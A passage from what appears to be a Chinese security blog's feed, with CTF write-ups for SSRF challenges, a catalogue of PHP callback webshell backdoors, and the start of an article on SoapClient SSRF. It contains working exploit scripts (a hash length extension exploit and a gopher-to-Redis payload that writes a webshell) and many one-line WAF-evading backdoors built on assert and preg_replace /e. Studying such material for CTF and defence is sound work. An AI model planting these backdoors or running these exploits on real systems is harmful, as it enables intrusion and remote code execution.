<span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> waf(param):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">&quot;code.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br></pre></td></tr></table></figure>
<ol>
<li>/：首页，获取源码；</li>
<li>/geneSign：从用户获取<code>param</code>参数，再结合预设的<code>action='scan'</code>调用<code>getSign</code>生成签名；</li>
<li>/De1ta：从cookie中获取<code>action</code>和<code>sign</code>，再获取<code>param</code>参数，结合当前IP地址构造一个Task类，最后以json的格式返回<code>Exec</code>方法执行结果。</li>
</ol>
<p>再来看getSign函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure>
<p>将 secert_key 和 param 和 action 拼在一起，对其md5签名。secert_key是随机生成的16个字节的字符串。</p>
<p>然后来看waf函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>禁止param参数以<code>gopher</code>和<code>file</code>开头。</p>
<p>再来看到 Task 类的 Exec 方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">    <span class="keyword">if</span> self.checkSign():</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            tmpfile = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">            resp = scan(self.param)</span><br><span class="line">            <span class="keyword">if</span> resp == <span class="string">&quot;Connection Timeout&quot;</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> resp</span><br><span class="line">                tmpfile.write(resp)</span><br><span class="line">                tmpfile.close()</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            f = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">        <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
<p>首先验证签名，如果是<code>scan</code>类型就调用 scan 方法来读取内容并写到沙盒下的 <code>result.txt</code> 文件。如果是<code>read</code>类型就读取沙盒中的<code>result.txt</code>内容。</p>
<p>那我们的思路就是：</p>
<ul>
<li>读取 flag.txt 到 result.txt。</li>
<li>展示 result.txt 的内容。</li>
</ul>
<h4 id="方法一">方法一</h4>
<p>预期解法：哈希长度拓展攻击+CVE-2019-9948(urllib)</p>
<p>简单来说MD5扩展长度攻击的原理：</p>
<blockquote>
<p><a href="https://www.jianshu.com/p/241e772a513f">https://www.jianshu.com/p/241e772a513f</a></p>
</blockquote>
<blockquote>
<p>当已知以下三点</p>
<ul>
<li>md5(salt+message)的值</li>
<li>message内容</li>
<li>salt+message长度</li>
</ul>
<p>我们可以在不知道salt的具体内容的情况下，计算出任意的md5(salt+message+padding+append)值</p>
</blockquote>
<p>urlopen有两种办法可以读取到本地文件。</p>
<ul>
<li>直接写文件名，前面啥都别带。</li>
<li>local_file: ,参考 <a href="https://bugs.python.org/issue35907">https://bugs.python.org/issue35907</a></li>
</ul>
<p>Python脚本exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://34b95521-f528-44e1-bcf5-b55918e71fc1.node3.buuoj.cn/&#x27;</span></span><br><span class="line">param = <span class="string">&#x27;flag.txt&#x27;</span></span><br><span class="line">r = requests.get(url + <span class="string">&#x27;getSign&#x27;</span>, params=&#123;<span class="string">&#x27;param&#x27;</span>: param&#125;)</span><br><span class="line">sign = r.text</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate sign</span></span><br><span class="line">hash_sign = hashpumpy.hashpump(sign, param + <span class="string">&#x27;scan&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">r = requests.get(url + <span class="string">&#x27;De1ta&#x27;</span>, params=&#123;<span class="string">&#x27;param&#x27;</span>: param&#125;, cookies=&#123;</span><br><span class="line">    <span class="string">&#x27;sign&#x27;</span>: hash_sign[<span class="number">0</span>],</span><br><span class="line">    <span class="string">&#x27;action&#x27;</span>: urllib.parse.quote(hash_sign[<span class="number">1</span>][len(url):])</span><br><span class="line">&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
<h4 id="方法二">方法二</h4>
<p>要想进入对action判断的部分，比如先验证签名：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">if</span> getSign(self.action, self.param) == self.sign:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<ol>
<li>在<code>checkSign()</code>函数的比较中，左边是<code>getSign(self.action, self.param)</code>，右边是<code>getSign('scan', param)</code>（因为在访问geneSign页面时，是自动传入<code>scan</code>参数）。</li>
<li>如果再写深一点，左边是<code>md5(key + self.param + self.action)</code>，考虑到要读取<code>flag.txt</code>文件，我们可以写成<code>md5(key + 'flag.txt' + self.action)</code>。</li>
<li>为了保证Exec()函数中scan部分和read部分都能被执行，<code>self.action</code>必须有<code>readscan</code>或<code>scanread</code>这样的字符串（注意：源码中用<code>in</code>操作符而不是用<code>==</code>）。</li>
<li>等号右边是<code>md5(key + param + 'scan')</code>，所以可以将等号左边的<code>self.action</code>定为<code>readscan</code>。</li>
<li>这样一来，等号左边为<code>md5(key + 'flag.txt' + 'readscan')</code>，现在就剩下等号右边的<code>param</code>参数没有确定，那么为了验证通过，我们可以将<code>param=flag.txtread</code>传参。</li>
<li>最后也就等价于<code>md5(key + 'flag.txt' + 'readscan') == md5(key + 'flag.txtread' + 'scan') </code></li>
</ol>
<p>payload1</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200620230158.png" alt=""></p>
<p>payload2</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200620230222.png" alt=""></p>
<h2 id="GKCTF2020-Ezweb">GKCTF2020 Ezweb</h2>
<p>打开题目查看源代码</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200711220548.png" alt=""></p>
<p>添加一下<code>?secret</code>参数，返回了<code>ifconfig</code>命令的结果</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200711220700.png" alt=""></p>
<p>应该是SSRF漏洞利用了，先尝试用file协议读文件，发现被ban掉了，用<code>file:/</code>或者<code>file: ///</code>绕过：</p>
<p>payload：<code>file: ///var/www/html/index.php</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200711220855.png" alt=""></p>
<p>审计一下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url</span>)</span>&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">echo</span> curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">		$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">		<span class="comment">//echo $url.&quot;\n&quot;;</span></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is&#x27;</span>, $url,$match))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//var_dump($match);</span></span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;别这样&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		curl($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;secret&#x27;</span>]))&#123;</span><br><span class="line">	system(<span class="string">&#x27;ifconfig&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>从源码中可知过滤了file协议、dict协议、127.0.0.1和localhost，但没有过滤http协议和gopher协议。</p>
<p>既然给了内网地址，那么先http协议探测一下内网主机存活，直接上工具Fuzz：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200711225350.png" alt=""></p>
<p>11端口的回显给了一个hint</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200711225429.png" alt=""></p>
<p>接着用http协议去Fuzz这个主机的端口</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200711234135.png" alt=""></p>
<p>发现了运行着Redis服务，直接用下面这个<a href="https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/#Redis4-x-5-x%E4%BB%8ESSRF%E5%88%B0RCE">脚本</a>生成payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;173.10.238.11&quot;</span>      // 运行有redis的主机ip</span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php system(\&quot;cat /flag\&quot;);?&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">	 <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.format(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">	 <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.format(path),</span><br><span class="line">	 <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.format(filename),</span><br><span class="line">	 <span class="string">&quot;save&quot;</span></span><br><span class="line">	 ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">	cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">	CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">	redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">	cmd+=<span class="string">&quot;*&quot;</span>+str(len(redis_arr))</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">		cmd+=CRLF+<span class="string">&quot;$&quot;</span>+str(len((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd+=CRLF</span><br><span class="line">	<span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">		payload += urllib.quote(redis_format(x))</span><br><span class="line">	<span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200711235713.png" alt=""></p>
<p>生成Payload后直接放在输入框中打过去，再输入<code>http://173.10.238.11/shell.php</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200711235812.png" alt=""></p>
<h2 id="HITCON-2017-SSRFme">HITCON 2017 SSRFme</h2>
<h3 id="TODO">TODO</h3>
<h2 id="网鼎杯-2018-Fakebook">网鼎杯 2018 Fakebook</h2>
<h3 id="TODO-v2">TODO</h3>
<h2 id="网鼎杯-2020-玄武组-SSRFMe">网鼎杯 2020 玄武组 SSRFMe</h2>
<h3 id="TODO-v3">TODO</h3>
]]></content>
      <categories>
        <category>CTF</category>
        <category>SSRF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全学习之回调后门</title>
    <url>/Web_security/php_related/1.PHP%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8/</url>
    <content><![CDATA[<h1 id="Web安全学习之PHP回调后门">Web安全学习之PHP回调后门</h1>
<p>在做一道CTF渗透类型的题目时，做到最后一步看到了<code>array_walk()</code>函数，于是直接Google这个函数漏洞，果然存在着回调后门（貌似是P牛起的这个名字），在此延申一下知识点做一个记录。</p>
<h2 id="什么是回调函数">什么是回调函数</h2>
<p>回调函数就是将一个函数作为参数传入另一个函数的函数。php中有许多这样的函数，比如<code>call_user_func</code> , <code>call_user_func_array</code>,<code>array_map</code>等等，这些函数可以将函数作为参数执行后返回主函数，方便使用，但是既然可以将函数作为参数传入执行，如果将一些危险的函数作为参数传入，那就有可能成为一个可利用且不易检测的后门。</p>
<h2 id="传统的回调后门">传统的回调后门</h2>
<p><code>call_user_func()</code>在PHP中是回调的标准的函数，第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数，返回值为回调函数的结果。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">call_user_func(<span class="string">&#x27;assert&#x27;</span>, $_REQUEST[<span class="string">&quot;pass&quot;</span>]);</span><br></pre></td></tr></table></figure>
<p><code>assert()</code>函数直接作为回调函数，然后<code>$_REQUEST[&quot;pass&quot;]</code>作为<code>assert</code>参数调用。</p>
<p>另外，PHP还提供另外一个相似的函数<code>call_user_func_array()</code>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">call_user_func_array(<span class="string">&#x27;assert&#x27;</span>, <span class="keyword">array</span>($_REQUEST[<span class="string">&#x27;pass&#x27;</span>]));</span><br></pre></td></tr></table></figure>
<p><code>call_user_func_array</code>函数，和<code>call_user_func</code>类似，只是第二个参数可以传入参数列表组成的数组。</p>
<h2 id="单个参数回调后门">单个参数回调后门</h2>
<blockquote>
<p>注意：这里的单个参数指的是回调函数的参数个数</p>
</blockquote>
<p>其实，在PHP中还有很多回调函数，这些含有回调（callable类型）参数的函数，其实都有做“回调后门”的潜力。 例如<code>array_filter()</code>函数：</p>
<blockquote>
<p><code>array array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )</code><br>
依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true，则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$e = $_REQUEST[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">&#x27;pass&#x27;</span>],);</span><br><span class="line">array_filter($arr, base64_decode($e));</span><br></pre></td></tr></table></figure>
<p><code>array_filter</code>函数是将数组中所有元素遍历并用指定函数处理过滤用的，<code>arr</code>数组中的每个元素都会作为base64解码后函数<code>e</code>的参数。如下图：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191121222629.png" alt=""></p>
<p>类似<code>array_filter</code>，<code>array_map</code>也有相同的功效：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$e = $_REQUEST[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">&#x27;pass&#x27;</span>],);</span><br><span class="line">array_map(base64_decode($e), $arr);</span><br></pre></td></tr></table></figure>
<p><strong>单参数后门的终极奥义：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line">register_shutdown_function($e, $_REQUEST[<span class="string">&#x27;pass&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="keyword">declare</span>(ticks=<span class="number">1</span>);</span><br><span class="line">register_tick_function ($e, $_REQUEST[<span class="string">&#x27;pass&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">filter_var($_REQUEST[<span class="string">&#x27;pass&#x27;</span>], FILTER_CALLBACK, <span class="keyword">array</span>(<span class="string">&#x27;options&#x27;</span> =&gt; <span class="string">&#x27;assert&#x27;</span>));</span><br><span class="line">filter_var_array(<span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span> =&gt; $_REQUEST[<span class="string">&#x27;pass&#x27;</span>]), <span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;filter&#x27;</span> =&gt; FILTER_CALLBACK, <span class="string">&#x27;options&#x27;</span> =&gt; <span class="string">&#x27;assert&#x27;</span>)));</span><br></pre></td></tr></table></figure>
<p>最后一个是filter_var的利用，PHP里用这个函数来过滤数组，只要指定过滤方法为回调（FILTER_CALLBACK），且option为assert即可。</p>
<h2 id="两个参数回调后门">两个参数回调后门</h2>
<p>在PHP5.4.8+版本中，assert有一个新的可选参数<code>descrition</code>。</p>
<blockquote>
<p>具体函数定义如下：</p>
<p>assert ( mixed $assertion [, string $description ] ) : bool</p>
</blockquote>
<p>所以较于之前的PHP版本，我们可以使用一些新的方式去进行调用：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span>, $_REQUEST[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line">uasort($arr, base64_decode($e));</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意：<code>$arr</code>数组中的元素都是回调函数<code>$e</code>的参数！</p>
</blockquote>
<p>在PHP5.4.8以上版本可以正常执行：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191122154659.png" alt=""></p>
<p>还有一些类似的函数，比如说<code>uksort()</code>：</p>
<blockquote>
<p>具体函数定义如下：</p>
<p>uksort ( array &amp;$array , callable $key_compare_func ) : bool</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span>, $_REQUEST[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line">uksort($arr, base64_decode($e));</span><br></pre></td></tr></table></figure>
<p>以及面向对象的方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// way 0</span></span><br><span class="line">$arr = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span>, $_REQUEST[<span class="string">&#x27;pass&#x27;</span>]));</span><br><span class="line">$arr-&gt;uasort(<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// way 1</span></span><br><span class="line">$arr = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span> =&gt; <span class="number">1</span>, $_REQUEST[<span class="string">&#x27;pass&#x27;</span>] =&gt; <span class="number">2</span>));</span><br><span class="line">$arr-&gt;uksort(<span class="string">&#x27;assert&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>再比如<code>array_reduce()</code>：</p>
<blockquote>
<p>PHP 4 &gt;= 4.0.5, PHP 5, PHP 7)<br>
array_reduce — 用回调函数迭代地将数组简化为单一的值</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">array_reduce($arr = <span class="keyword">array</span>(<span class="string">&#x27;&#x27;</span>), base64_decode($_REQUEST[<span class="string">&#x27;e&#x27;</span>]), $_REQUEST[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p><code>array_udiff()</code>函数</p>
<blockquote>
<p>(PHP 5, PHP 7)<br>
array_udiff — 用回调函数比较数据来计算数组的差集</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">array_udiff($arr = <span class="keyword">array</span>($_REQUEST[<span class="string">&#x27;a&#x27;</span>]), $arr1 = <span class="keyword">array</span>(<span class="string">&#x27;&#x27;</span>), base64_decode($_REQUEST[<span class="string">&#x27;e&#x27;</span>]));</span><br></pre></td></tr></table></figure>
<h2 id="三个参数回调后门">三个参数回调后门</h2>
<p>有些函数需要的回调函数类型比较苛刻，回调格式需要三个参数，比如<code>array_walk()</code>。</p>
<blockquote>
<p>函数定义：array_walk ( array <code>&amp;$array</code> , callable<code>$callback</code> [, mixed <code>$userdata</code> = <strong><code>NULL</code></strong> ] ) : bool</p>
</blockquote>
<p>它的参数解释：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191122165733.png" alt=""></p>
<p>三个参数可以用<code>preg_replace()</code>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">&#x27;pass&#x27;</span>] =&gt; <span class="string">&#x27;|.*|e&#x27;</span>,);</span><br><span class="line">array_walk($arr, $e, <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>执行效果如下图：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191122191940.png" alt=""></p>
<p>需要对这段代码做出一定的解释：</p>
<p><code>preg_replace</code> 函数是用来执行一个正则表达式的搜索和替换，它的函数定义如下：</p>
<blockquote>
<p>preg_replace ( mixed <code>$pattern</code> , mixed <code>$replacement</code> , mixed <code>$subject</code> [, int <code>$limit</code> = -1 [, int <code>&amp;$count</code> ]] ) : mixed</p>
</blockquote>
<p>根据<code>array_walk()</code>参数解释可以得出，<code>array_walk($arr, $e, '');</code>等价于：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">preg_replace(<span class="string">&#x27;|.*|e&#x27;</span>, <span class="string">&#x27;phpinfo()&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>第一个参数<code>|.*|e</code>表示的是<a href="https://blog.csdn.net/windqyoung/article/details/8635418">\e模式匹配</a>，即会把replacement参数当作PHP语句来执行，<code>.*</code>是贪婪匹配。</p>
<p>除了<code>array_walk()</code>，还可以使用<code>array_walk_recurcive()</code>，参数的位置都是一样的：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">&#x27;pass&#x27;</span>] =&gt; <span class="string">&#x27;|.*|e&#x27;</span>,);</span><br><span class="line">array_walk_recursive($arr, $e, <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>看了以上几个回调后门，发现<code>preg_replace()</code>确实好用。但显然很多WAF都会对其有所防备。其实PHP里不止这个函数可以执行eval的功能，还有几个类似的：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mb_ereg_replace(<span class="string">&#x27;.*&#x27;</span>, $_REQUEST[<span class="string">&#x27;pass&#x27;</span>], <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;e&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>另外一个：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> preg_filter(<span class="string">&#x27;|.*|e&#x27;</span>, $_REQUEST[<span class="string">&#x27;pass&#x27;</span>], <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h2 id="Reference">Reference</h2>
<p><a href="https://leavesongs.com/PENETRATION/php-callback-backdoor.html">创造tips的秘籍——PHP回调后门</a></p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>web安全基础</tag>
        <tag>回调后门</tag>
      </tags>
  </entry>
  <entry>
    <title>利用SoapClient类进行SSRF+CRLF攻击</title>
    <url>/Web_security/php_related/10.%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF-CRLF%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id="【转】利用SoapClient类进行SSRF-CRLF攻击">【转】利用SoapClient类进行SSRF+CRLF攻击</h1>
<blockquote>
<p>原文链接：<a href="https://lethe.site/2019/09/06/%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF-CRLF%E6%94%BB%E5%87%BB/#">https://lethe.site/2019/09/06/利用SoapClient类进行SSRF-CRLF攻击/#</a></p>
<p>太懒了，就不重复总结了。转载lethe师傅的一篇文章，侵权删文。</p>
</blockquote>
<h2 id="0x01-什么是Soap">0x01 什么是Soap</h2>
<p>SOAP是webService三要素（SOAP、WSDL、UDDI）之一：</p>
<ul>
<li>WSDL 用来描述如何访问具体的接口。</li>
<li>UDDI用来管理，分发，查询webService。</li>
<li>SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。<br>
其采用HTTP作为底层通讯协议，XML作为数据传送的格式。</li>
</ul>
<h2 id="0x02-PHP中的SoapClient类">0x02 PHP中的SoapClient类</h2>
<p>参考链接：<a href="https://www.php.net/manual/zh/soapclient.soapclient.php">https://www.php.net/manual/zh/soapclient.soapclient.php</a></p>
